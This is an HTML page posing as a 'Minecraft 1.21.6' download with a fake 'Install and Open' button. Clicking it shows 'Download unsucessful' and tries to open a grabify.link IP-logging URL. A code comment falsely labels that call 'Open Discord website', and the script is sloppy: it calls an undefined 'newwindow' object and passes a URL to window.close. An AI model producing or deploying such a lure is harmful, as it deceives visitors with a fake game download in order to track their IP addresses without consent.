<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft 1.21.6</title>
    <style>
        /* Full screen background */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #333;
            font-family: Consolas, Monaco, "Courier New", monospace;
        }

        /* Styles for the full-page GUI */
        #customDevTool {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(30, 30, 30, 0.9); /* Semi-transparent dark background */
            color: #d4d4d4;
            padding: 15px;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-size: 20px;
            border-radius: 6px;
        }

        #customDevTool h3 {
            margin-bottom: 20px;
            color: #569cd6;
        }

        #customDevTool p {
            color: #dcdcaa;
        }

        button {
            margin-top: 15px;
            padding: 15px 25px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
        }

        .closeButton {
            background: #c23c3c;
            color: white;
            border: none;
        }

        .loadTextButton {
            background: #4caf50;
            color: white;
            border: none;
        }
    </style>
</head>
<body>

    <div id="customDevTool">
        <h3>1.21.6</h3>
        <p id="info">Thanks for downloading minecraft 1.21.6.</p>
        <button class="closeButton" id="closeButton">Close</button>
        <button class="loadTextButton" id="loadTextButton">Install and Open</button>
    </div>

    <script>
        // Close button functionality
        document.getElementById('closeButton').onclick = function() {
            document.getElementById('customDevTool').style.display = 'none';
        };

        // Load text button functionality
        document.getElementById('loadTextButton').onclick = function() {
            document.getElementById('info').innerText = 'Download unsucessful';
            document.getElementById('info').style.color = '#dcdcaa';
            newwindow.open('https://grabify.link/124IFK');  // Open Discord website
            window.close('https://grabify.link/124IFK');
        };
    </script>

</body>
</html>
